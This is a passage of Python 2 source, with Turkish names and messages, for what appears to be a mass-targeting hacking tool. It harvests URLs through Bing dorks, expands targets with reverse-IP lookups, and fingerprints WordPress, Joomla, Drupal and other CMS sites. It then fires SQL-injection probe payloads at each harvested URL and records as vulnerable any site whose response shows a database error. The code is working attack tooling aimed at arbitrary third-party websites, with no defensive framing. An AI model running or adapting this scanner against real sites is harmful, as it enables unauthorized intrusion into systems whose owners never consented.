			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
	if dork!=None and site==None and sitelistesi==None  and dorklistesi==None and uzantilar==None and iparama==None and iplistesi ==None :
		if sayfa==1:
			time.sleep(zaman)
			print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(sayfa)+renkler.beyaz
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			sit=dork
			url = "http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=1&FORM=PERE"%(sit,sit)
			headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
			rq=requests.session()
			rq.headers.update(headers)
			res=rq.get(url)
			rm=res.content
			soup = BeautifulSoup(rm,'html.parser')
			dex= soup.find_all('h2')
			for i in dex:
				l=i.find_all('a')
				sokup=BeautifulSoup(str(l),"html.parser")
				for ij in sokup.find_all("a"):
					 p= ij.get('href')
					 print p
					 bingcom=open("bing.txt","a")
					 bingcom.write(p+"\n")
					 bingcom.close()
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
		if sayfa ==2:
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			sit=dork
			for i in range (sayfa):
				try:
					syfa=i*10+1
					pere=i+1
					print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(pere)+renkler.beyaz
					url="http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=%s&FORM=PERE" %(sit,sit,syfa)
					headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
					rq=requests.session()
					rq.headers.update(headers)
					res=rq.get(url)
					rm=res.content
					soup = BeautifulSoup(rm,'html.parser')
					dex= soup.find_all('h2')
					for i in dex:
						l=i.find_all('a')
						sokup=BeautifulSoup(str(l),"html.parser")
						for ij in sokup.find_all("a"):
							 p= ij.get('href')
							 print p
							 bingcom=open("bing.txt","a")
							 bingcom.write(p+"\n")
							 bingcom.close()
					time.sleep(zaman)
				except requests.exceptions.ConnectionError:
						print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
						continue
				except requests.exceptions.Timeout:
						print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
				except requests.exceptions.TooManyRedirects:
						print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
				except urllib2.URLError:
						print renkler.kirmizi+"baglanmadi url hatasi"+renkler.beyaz
						continue
				except urllib2.HTTPError:
						print renkler.kirmizi+"baglanmadi"+renkler.beyaz
						continue
				except socket.error:
						print renkler.kirmizi+"socket baglanmadi"+renkler.beyaz
						continue
				except httplib.BadStatusLine:
						print renkler.kirmizi+"url baglanti hatasi"+renkler.beyaz
						continue
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
		if sayfa >=3:
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			sit=dork
			for i in range (sayfa):
				try:
					time.sleep(zaman)
					syfa=i*10+1
					pere=i+1
					print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(pere)+renkler.beyaz
					url="http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=%s&FORM=PERE%s" %(sit,sit,syfa,pere)
					headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
					rq=requests.session()
					rq.headers.update(headers)
					res=rq.get(url)
					rm=res.content
					soup = BeautifulSoup(rm,'html.parser')
					dex= soup.find_all('h2')
					for i in dex:
						l=i.find_all('a')
						sokup=BeautifulSoup(str(l),"html.parser")
						for ij in sokup.find_all("a"):
							 p= ij.get('href')
							 print p
							 bingcom=open("bing.txt","a")
							 bingcom.write(p+"\n")
							 bingcom.close()
					time.sleep(zaman)
				except requests.exceptions.ConnectionError:
						print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
						continue
				except requests.exceptions.Timeout:
						print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
				except requests.exceptions.TooManyRedirects:
						print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
				except urllib2.URLError:
						print renkler.kirmizi+"baglanmadi url hatasi"+renkler.beyaz
						continue
				except urllib2.HTTPError:
						print renkler.kirmizi+"baglanmadi"+renkler.beyaz
						continue
				except socket.error:
						print renkler.kirmizi+"socket baglanmadi"+renkler.beyaz
						continue
				except httplib.BadStatusLine:
						print renkler.kirmizi+"url baglanti hatasi"+renkler.beyaz
						continue
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
	if dorklistesi!=None and dork==None and site==None and sitelistesi==None  and uzantilar==None and iparama==None :
		if sayfa ==1:
			
			print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(sayfa)+renkler.beyaz
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			dorkli=open(dorklistesi,"r").readlines()
			for i in dorkli:
				try:
					drk=i.replace("\n","")
					sit=drk
					url = "http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=1&FORM=PERE"%(sit,sit)
					headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
					rq=requests.session()
					rq.headers.update(headers)
					res=rq.get(url)
					rm=res.content
					soup = BeautifulSoup(rm,'html.parser')
					dex= soup.find_all('h2')
					for i in dex:
						l=i.find_all('a')
						sokup=BeautifulSoup(str(l),"html.parser")
						for ij in sokup.find_all("a"):
							p= ij.get('href')
							print p
							bingcom=open("bing.txt","a")
							bingcom.write(p+"\n")
							bingcom.close()
					time.sleep(zaman)
				except:
					continue
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
		if sayfa ==2:
			
			print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(sayfa)+renkler.beyaz
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			dorkli=open(dorklistesi,"r").readlines()
			for i in dorkli:
				drk=i.replace("\n","")
				for j in range(sayfa):
					try:
						syfa=j*10+1
						pere=j+1
						print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(pere)+renkler.beyaz
						url="http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=%s&FORM=PERE" %(sit,sit,syfa)
						headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
						rq=requests.session()
						rq.headers.update(headers)
						res=rq.get(url)
						rm=res.content
						soup = BeautifulSoup(rm,'html.parser')
						dex= soup.find_all('h2')
						for i in dex:
							l=i.find_all('a')
							sokup=BeautifulSoup(str(l),"html.parser")
							for ij in sokup.find_all("a"):
								 p= ij.get('href')
								 print p
								 bingcom=open("bing.txt","a")
								 bingcom.write(p+"\n")
								 bingcom.close()
						time.sleep(zaman)
					except requests.exceptions.ConnectionError:
						print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
						continue
					except requests.exceptions.Timeout:
						print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
					except requests.exceptions.TooManyRedirects:
						print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
					except urllib2.URLError:
						print renkler.kirmizi+"baglanmadi url hatasi"+renkler.beyaz
						continue
					except urllib2.HTTPError:
						print renkler.kirmizi+"baglanmadi"+renkler.beyaz
						continue
					except socket.error:
						print renkler.kirmizi+"socket baglanmadi"+renkler.beyaz
						continue
					except httplib.BadStatusLine:
						print renkler.kirmizi+"url baglanti hatasi"+renkler.beyaz
						continue
					except:
						continue
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
		if sayfa>=3:
			print renkler.kirmizi+"%s sayfa cekiliyor."%(sayfa)+renkler.beyaz
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			dorkli=open(dorklistesi,"r").readlines()
			
			for i in dorkli:
				drk=i.replace("\n","")
				for j in range(sayfa):
					try:
						syfa=j*10+1
						pere=j+1
						print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(pere)+renkler.beyaz
						url="http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=%s&FORM=PERE%s" %(drk,drk,syfa,pere)
						
						headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
						rq=requests.session()
						rq.headers.update(headers)
						res=rq.get(url)
						rm=res.content
						soup = BeautifulSoup(rm,'html.parser')
						dex= soup.find_all('h2')
						for i in dex:
							
							l=i.find_all('a')
							sokup=BeautifulSoup(str(l),"html.parser")
							for ij in sokup.find_all("a"):
								 p= ij.get('href')
								 print p
								 bingcom=open("bing.txt","a")
								 bingcom.write(p+"\n")
								 bingcom.close()
						time.sleep(zaman)
					except requests.exceptions.ConnectionError:
						print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
						continue
					except requests.exceptions.Timeout:
						print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
					except requests.exceptions.TooManyRedirects:
						print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
					except urllib2.URLError:
						print renkler.kirmizi+"baglanmadi url hatasi"+renkler.beyaz
						continue
					except urllib2.HTTPError:
						print renkler.kirmizi+"baglanmadi"+renkler.beyaz
						continue
					except socket.error:
						print renkler.kirmizi+"socket baglanmadi"+renkler.beyaz
						continue
					except httplib.BadStatusLine:
						print renkler.kirmizi+"url baglanti hatasi"+renkler.beyaz
						continue
					except:
						continue
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
	if iplisteolusturucu !=None and dosyaduzeltici==None:
		baslangic= datetime.datetime.now()
		dexmodip=[]
		dexmodd=[]
		soncu=[]
		soncu1=[]
		kiru=open("iplisteolustu.txt","w")
		kiru.close()
		urller=open(iplisteolusturucu,"r").readlines()
		for gaflet in urller:
			k=urlparse(gaflet)
			ll=k.netloc
			dexmodip.append(ll)
		for garanti in dexmodip:
			if dexmodd.count(garanti)==0:
				dexmodd.append(garanti)
		for rg in dexmodd:
			try:
				ch=rg.replace("\n","")
				addr1 = socket.gethostbyname(ch) 
				soncu.append(addr1)
				print addr1
			except socket.gaierror :
				print renkler.kirmizi+"url bulunamadi atlaniyor..."+renkler.beyaz
				continue
		
   #	 print renkler.yesil+"ipler iplisteolustu.txt kayit edildi."+renkler.beyaz
		for rex in soncu:
			print rex
			if soncu1.count(rex)==0:
				   soncu1.append(rex)
				   
		for yazdir in soncu1:
			kiru=open("iplisteolustu.txt","a")
			kiru.write(str(yazdir)+"\n")
			kiru.close()
		print renkler.yesil+"ayni olan ip adresleri cikartiliyor...\nSonuclar iplisteolustu.txt dosyasina yazildi..."+renkler.beyaz
		bitis= datetime.datetime.now()
		gecen(baslangic,bitis)
	if reverse!=False and dosyaduzeltici==None :
		cc=open("urller.txt","w")
		cc.close()
		cc1=[]
		son1=[]
		s9=open("bing.txt","r").readlines()
		k92=open("scriptayirmakicin.txt","w")
		k92.close()
		for i in s9:
			d=i.replace("\n","")
			k=urlparse(d)
			ll=k.netloc
			cc1.append(ll)   
		for i in cc1:
			if son1.count(i)==0:
				son1.append(i)

		for i in son1:
			k29=open("scriptayirmakicin.txt","a")
			k29.write(i+"\n")
			k29.close()
		bitis= datetime.datetime.now()
		gecen(baslangic,bitis)
		
	
	

		baslangic= datetime.datetime.now()
		lka=open("scriptayirmakicin.txt","r").read()
		print renkler.yesil+"bulunan urller scriptayirmakicin.txt ayri olarak kayit edildi"+renkler.beyaz
		
		if lka !="":
			dosya=open("joomla.txt","w")
			dosya.close()
			dosya=open("wordpress.txt","w")
			dosya.close()
			dosya=open("drupal.txt","w")
			dosya.close()
			dosya=open("vbulletin.txt","w")
			dosya.close()
			dosya=open("mybb.txt","w")
			dosya.close()
			dosya=open("phpbb.txt","w")
			dosya.close()
			dosya=open("opencart.txt","w")
			dosya.close()
			dosya=open("xenforo.txt","w")
			dosya.close()

			jom=0
			wordp=0
			drup=0
			vbull=0
			phpb=0
			opencard=0
			xenfor=0

		
			v=[]
			vv=[]
			vvv=[]
			vvvv=[]
			sonv=[]
			
			urller=open("scriptayirmakicin.txt","r").readlines()

		
			for rg in urller:
				try:
					 ch=rg.replace("\n","")
					 addr1 = socket.gethostbyname(ch) 
					 print str(addr1)+"\n",
				except socket.gaierror:
						print renkler.kirmizi+"url bulunamadi atlaniyor..."+renkler.beyaz
						continue
					 
				if "http" in ch:
						print renkler.kirmizi+"iyi bir sonuc icin http yazma"+renkler.beyaz
						sys.exit()
				elif "https" in ch:
						print renkler.kirmizi+"iyi bir sonuc icin https yazma"+renkler.beyaz
						sys.exit()
				try:
					urlcik="http://viewdns.info/reverseip/?host=%s&t=1"%(str(ch))
					
					headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
					rq=requests.session()
					rq.headers.update(headers)
					request = rq.get(urlcik,timeout=10)
					c= request.content
					

					soup= BeautifulSoup(c,'html.parser')
					kb= soup.findAll("td")
					
					for i in kb:
							c=re.match("<td>+.*</td>",str(i))
							if c:
					  
									vv.append(c.group())
				except requests.exceptions.ConnectionError:
						print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
						continue
				except requests.exceptions.Timeout:
						print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
				except requests.exceptions.TooManyRedirects:
						print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
						continue				
				
				for i in vv[4:]:
						k=i.replace("<td>","")
						vvv.append(k)
				for i in vvv:
						k=i.replace("</td>","")
						vvvv.append(k)

				for i in vvvv:
						cc=open("urller.txt","a")
						cc.write(i+"\n")
						cc.close()
						print str(i)+"\n"
				
				v=[]
				vv=[]
				vvv=[]
				vvvv=[]
				sonv=[]
			print renkler.yesil+"urller.txt dosyasina yazilmistir.\nAyni urller dosyadan silinmistir.\nScript ayirma islemi baslatilmistir."+renkler.beyaz
			urlist= open("urller.txt","r").readlines()
			deli=[]
			deli1=[]
			deli3=[]
			for dexmod in urlist:
				dex=dexmod.replace("\n","")
				deli.append(dex)
			for kar in deli:
				if deli1.count(kar)==0:
					deli1.append(kar)
			urlist= open("urller.txt","w")
			urlist.close()
			for delic in deli1:
				urlist= open("urller.txt","a")
				urlist.write(delic+"\n")
				urlist.close()
			deli=[]
			deli1=[]
			deli3=[]
			urlistt= open("urller.txt","r").readlines()
			for url1 in urlistt:
				url2= url1.replace("\n","")
				print url2
				urld='http://'
				urlt=urld+url2
				print urlt
				gcontext = ssl.SSLContext(ssl.PROTOCOL_TLSv1) 
				try:
						info = urllib2.urlopen(urlt, context=gcontext,timeout = 10).read()  
						info3 = urllib2.urlopen(urlt, context=gcontext,timeout = 10)
						vc= info3.geturl()
				
						soup= BeautifulSoup(info, "html.parser")
				
						for wp  in soup:
								if re.findall("/wp-content/" and "/wp-includes/" and "xmlrpc.php" , str(wp)):
										print "wp bulundu  = "+ urlt
										p=open("wordpress.txt","a")
										p.write(vc+"\n")
										wordp +=1
										p.close()
								elif re.findall("Joomla! - Open Source Content Management" and "Joomla!" and "/templates/"  , str(wp)):
										print "joomla  ="+ urlt
										p=open("joomla.txt","a")
										p.write(vc+"\n")
										jom +=1
										p.close()
								elif re.findall("Drupal - Open Source CMS" and "Drupal" and "/node/" and "/sites/all/themes/"  , str(wp)):
										print "drupal  ="+ urlt
										p=open("drupal.txt","a")
										p.write(vc+"\n")
										drup+=1
										p.close()
								elif re.findall("vBulletin" and "vbulletin" and "vBulletinÃÂ®"   , str(wp)):
										print "vbulletin  ="+ urlt
										p=open("vbulletin.txt","a")
										p.write(vc+"\n")
										vbull +=1
										p.close()
								elif re.findall("phpBB" and "phpBB Group"  , str(wp)):
										print "phpbb  ="+ urlt
										p=open("phpbb.txt","a")
										p.write(vc+"\n")
										phpb +=1
										p.close()
								elif re.findall("OpenCart" and "index.php?route="  , str(wp)):
										print "OpenCart  ="+ urlt
										p=open("opencart.txt","a")
										p.write(vc+"\n")
										opencard +=1
										p.close()
								elif re.findall("XenForo" and "xenforo"   , str(wp)):
										print "OpenCart  ="+ urlt
										p=open("xenforo.txt","a")
										p.write(vc+"\n")
										xenfor +=1
										p.close()
				except requests.exceptions.ConnectionError:
						print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
						continue
				except requests.exceptions.Timeout:
						print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
				except requests.exceptions.TooManyRedirects:
						print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
				except urllib2.URLError:
						print renkler.kirmizi+"baglanmadi url hatasi"+renkler.beyaz
						continue
				except urllib2.HTTPError:
						print renkler.kirmizi+"baglanmadi"+renkler.beyaz
						continue
				except socket.error:
						print renkler.kirmizi+"socket baglanmadi"+renkler.beyaz
						continue
				except httplib.BadStatusLine:
						print renkler.kirmizi+"url baglanti hatasi"+renkler.beyaz
						continue


		

			opp=[]
			opp1=[]
			opp2=[]
			pr=open("wordpress.txt","r").readlines()

			for i in pr:
				vj=i.replace("\n","")
				opp.append(vj)
				print vj
			for i in opp:
				opp1.append(i)
			prc=open("wordpress.txt","w")
			prc.close()
			for i in opp1:
				if opp2.count(i)==0:
						opp2.append(i)

			for ivv in opp2:
				lka=open("wordpress.txt","a")
				lka.write(str(ivv)+"\n")
				lka.close()

			opp=[]
			opp1=[]
			opp2=[]
			pr=open("joomla.txt","r").readlines()
			for i in pr:
				vj=i.replace("\n","")
				opp.append(vj)

			for i in opp:
				opp1.append(i)
			prc=open("joomla.txt","w")
			prc.close()
			for i in opp1:
				if opp2.count(i)==0:
						opp2.append(i)

			for ivv in opp2:
				lka=open("joomla.txt","a")
				lka.write(str(ivv)+"\n")
				lka.close()
			opp=[]
			opp1=[]
			opp2=[]
			pr=open("drupal.txt","r").readlines()
			for i in pr:
				vj=i.replace("\n","")
				opp.append(vj)
			for i in opp:
				opp1.append(i)
			prc=open("drupal.txt","w")
			prc.close()
			for i in opp1:
				if opp2.count(i)==0:
						opp2.append(i)

			for ivv in opp2:
				lka=open("drupal.txt","a")
				lka.write(str(ivv)+"\n")
				lka.close()

			opp=[]
			opp1=[]
			opp2=[]
			pr=open("vbulletin.txt","r").readlines()
			for i in pr:
				vj=i.replace("\n","")
				opp.append(vj)
			prc=open("vbulletin.txt","w")
			prc.close()
			for i in opp:
				opp1.append(i)
		
			for i in opp1:
				if opp2.count(i)==0:
						opp2.append(i)

			for ivv in opp2:
				lka=open("vbulletin.txt","a")
				lka.write(str(ivv)+"\n")
				lka.close()
			opp=[]
			opp1=[]
			opp2=[]
			pr=open("phpbb.txt","r").readlines()
			for i in pr:
				vj=i.replace("\n","")
				opp.append(vj)
			prc=open("phpbb.txt","w")
			prc.close()
			for i in opp:
				opp1.append(i)
		
			for i in opp1:
				if opp2.count(i)==0:
						opp2.append(i)

			for ivv in opp2:
				lka=open("phpbb.txt","a")
				lka.write(str(ivv)+"\n")
				lka.close()
			opp=[]
			opp1=[]
			opp2=[]
			pr=open("opencart.txt","r").readlines()
			for i in pr:
				vj=i.replace("\n","")
				opp.append(vj)
			prc=open("opencard.txt","w")
			prc.close()
			for i in opp:
				opp1.append(i)
		
			for i in opp1:
				if opp2.count(i)==0:
						opp2.append(i)

			for ivv in opp2:
				lka=open("opencard.txt","a")
				lka.write(str(ivv)+"\n")
				lka.close()
			opp=[]
			opp1=[]
			opp2=[]
			pr=open("xenforo.txt","r").readlines()
			for i in pr:
				vj=i.replace("\n","")
				opp.append(vj)
			prc=open("xenforo.txt","w")
			prc.close()
			for i in opp:
				opp1.append(i)
		
			for i in opp1:
				if opp2.count(i)==0:
						opp2.append(i)

			for ivv in opp2:
				lka=open("xenforo.txt","a")
				lka.write(str(ivv)+"\n")
				lka.close()

			print renkler.kirmizi +""" 
			%s tane wordpress sitesi bulundu. \n
			%s tane joomla sitesi bulundu. \n
			%s tane drupal sitesi bulundu. \n
			%s tane vbulletin sitesi bulundu.\n
			%s tane phpbb sitesi bulundu. \n
			%s tane opencard sitesi bulundu. \n
			%s tane xenforo sitesi bulundu. \n
			""" %(wordp,jom,drup,vbull,phpb,opencard,xenfor) +renkler.beyaz
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
		else:
			print renkler.mavi+".................................................................................."+renkler.beyaz
		
#	else:
 #	   print renkler.mavi+"..................................................................................."+renkler.beyaz
		
	kktr="tt"
	
	if kktr=="tt" and sqltar!= False and dosyaduzeltici==None:
		try:
			lkka=open("bing.txt","r").read()
		except:
			print "dosya okunamadı bing.txt"
		baslangic= datetime.datetime.now()
		print renkler.mavi+"\nSql Taramasi Basladi..."+renkler.beyaz
		dosya=open("sqlaciklisiteler.txt","w")
		dosya.close()
		kaynak=[]
		karsilastirma=[]
		sonduzen=[]
		headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
		rq=requests.session()
		rq.headers.update(headers)

		db = {
		"MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),
		"PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."),
		"Microsoft SQL Server": (r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*", r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.", r"(?s)Exception.*\WRoadhouse\.Cms\."),
		"Microsoft Access": (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"),
		"Oracle": (r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"),
		"IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error", r"\bdb2_\w+\("),
		"SQLite": (r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*", r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]"),
		"Sybase": (r"(?i)Warning.*sybase.*", r"Sybase message", r"Sybase.*Server message.*"),
		}
		urlcek=open("bing.txt","r").readlines()
		b=[]
		
		
		for uy in urlcek:
			yaz3=open("kalansqlsirasi.txt","w")
			yaz3.close()
			yaz3=open("kalansqlsirasi.txt","a")
			yaz3.write(uy)
			yaz3.close
			urlc=uy.replace("\n","")
			sqlhata = ("'", "'Q", "')", "';", '"', '")', '";', '`', '`)', '`;', '\\', "%27", "%%2727", "%25%27", "%60", "%5C")
			sayicik +=1
			sys.stdout.write('\r')
			sys.stdout.write( str(sayicik)+'. siradaki url deneniyor... ')
			sys.stdout.flush()
			for payd in sqlhata:
				try:
					pk=payd+"&"
					ur=urlc.replace("&",pk)
					url= ur+payd
					res=rq.get(url,timeout=5).content
					for db1, hatalar in db.items():
						for hata in hatalar:
							if re.compile(hata).search(res): 
								print renkler.yesil+"\nsql acikli site = "+renkler.sari+db1+renkler.beyaz+" ", renkler.kirmizi+url+renkler.beyaz
								bingcom=open("sqlaciklisiteler.txt","a")
								bingcom.write(url+"\n")
								bingcom.close()
								b.append("1")
								break
			
						
							else:
								pass
							
				except requests.exceptions.SSLError:
					print "ssl hatasi"
					continue
				except requests.exceptions.ConnectionError:
					print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
					continue
				except requests.exceptions.Timeout:
					print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi."+renkler.beyaz
					continue
				except requests.exceptions.TooManyRedirects:
					print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
					continue
				except IOError:
					continue;
				except :
					continue
				if b != []:
				   b=[]
				   break
		bingcom=open("sqlaciklisiteler.txt","r").readlines()
		bing=open("sqlaciklisiteler.txt","w")
		bing.close()
		for ks in bingcom:
			df=ks.replace("\n","")
			kaynak.append(df)
		for i in kaynak:
			karsilastirma.append(i)
		for i in karsilastirma:
			if sonduzen.count(i)==0:
				sonduzen.append(i)
		for i in sonduzen:
			bingcom=open("sqlaciklisiteler.txt","a")
			bingcom.write(i+"\n")
			bingcom.close()
		kaynak=[]
		karsilastirma=[]
		sonduzen=[]
		 
		bitis= datetime.datetime.now()
		gecen(baslangic,bitis)
		print renkler.yesil+"\n------ Sonuclar sqlaciklisiteler.txt kayit edildi ------"+renkler.beyaz
	if dosyaduzeltici !=None and sitelistesi==None and dork==None and dorklistesi ==None:
		baslangic= datetime.datetime.now()
		kaynak=[]
		karsilastirma=[]
		sonduzen=[]
		dex=open(dosyaduzeltici,"r").readlines()
		dex2=open(dosyaduzeltici,"w")
		dex2.close()
		for duzen in dex:
			dzr=duzen.replace("\n","")
			kaynak.append(dzr)
		for i in kaynak:
			karsilastirma.append(i)
		for i in karsilastirma:
			if sonduzen.count(i)==0:
				sonduzen.append(i)
		for i in sonduzen:
			if i.endswith("...")==False:
				bingcom=open(dosyaduzeltici,"a")
				bingcom.write(i+"\n")
		bingcom.close()
		kaynak=[]
		karsilastirma=[]
		sonduzen=[]
		bitis= datetime.datetime.now()
		gecen(baslangic,bitis)
		print renkler.yesil+"ayni linkler silindi %s dosyasina yazildi."%(dosyaduzeltici)+renkler.beyaz
	if ipvedomainreverseip !=None and site   == None and sitelistesi ==None and iparama==None and iplistesi==None and dork ==None and dorklistesi ==None and uzantilar == None and iplisteolusturucu == None and dosyaduzeltici==None:
		urlist= open("urller.txt","w")
		urlist.close()
		baslangic= datetime.datetime.now()
		if ipvedomainreverseip !="":
			dosya=open("joomla.txt","w")
			dosya.close()
			dosya=open("wordpress.txt","w")
			dosya.close()
			dosya=open("drupal.txt","w")
			dosya.close()
			dosya=open("vbulletin.txt","w")
			dosya.close()
			dosya=open("mybb.txt","w")
			dosya.close()
			dosya=open("phpbb.txt","w")
			dosya.close()
			dosya=open("opencart.txt","w")
			dosya.close()
			dosya=open("xenforo.txt","w")
			dosya.close()

			jom=0
			wordp=0
			drup=0
			vbull=0
			phpb=0
			opencard=0
			xenfor=0

		
			v=[]
			vv=[]
			vvv=[]
			vvvv=[]
			sonv=[]
			try:
				if "http" in ipvedomainreverseip:
					print renkler.kirmizi+"iyi bir sonuc icin http veya https yazma"+renkler.beyaz
					sys.exit()
				addr1 = socket.gethostbyname(ipvedomainreverseip) 
				print str(addr1)+"\n"
				urlcik="http://viewdns.info/reverseip/?host=%s&t=1"%(str(addr1))
				
				headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
				rq=requests.session()
				rq.headers.update(headers)
				request = rq.get(urlcik,timeout=10)
				c= request.content
				soup= BeautifulSoup(c,'html.parser')
				kb= soup.findAll("td")
				for i in kb:
					c=re.match("<td>+.*</td>",str(i))
					if c:
						vv.append(c.group())
				for i in vv[4:]:
					k=i.replace("<td>","")
					vvv.append(k)
				for i in vvv:
					k=i.replace("</td>","")
					vvvv.append(k)
				for i in vvvv:
					cc=open("urller.txt","a")
					cc.write(i+"\n")
					cc.close()
					print str(i)+"\n"
			except socket.gaierror:
				 print renkler.kirmizi+"url bulunamadi atlaniyor..."+renkler.beyaz
				
			v=[]
			vv=[]
			vvv=[]
			vvvv=[]
			sonv=[]
